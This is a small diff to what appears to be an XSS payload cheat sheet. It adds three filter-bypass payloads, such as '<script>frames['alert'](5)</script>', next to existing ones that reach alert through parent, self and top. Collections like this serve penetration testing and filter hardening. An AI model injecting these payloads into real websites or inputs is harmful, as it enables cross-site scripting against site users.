@@ -469,6 +469,10 @@ Bypass using an alternate way to execute an alert
 <script>parent['alert'](1)</script>
 <script>self['alert'](2)</script>
 <script>top['alert'](3)</script>
+<script>this['alert'](4)</script>
+<script>frames['alert'](5)</script>
+<script>content['alert'](6)</script>
+
 ```
 
 Bypass using an alternate way to trigger an alert
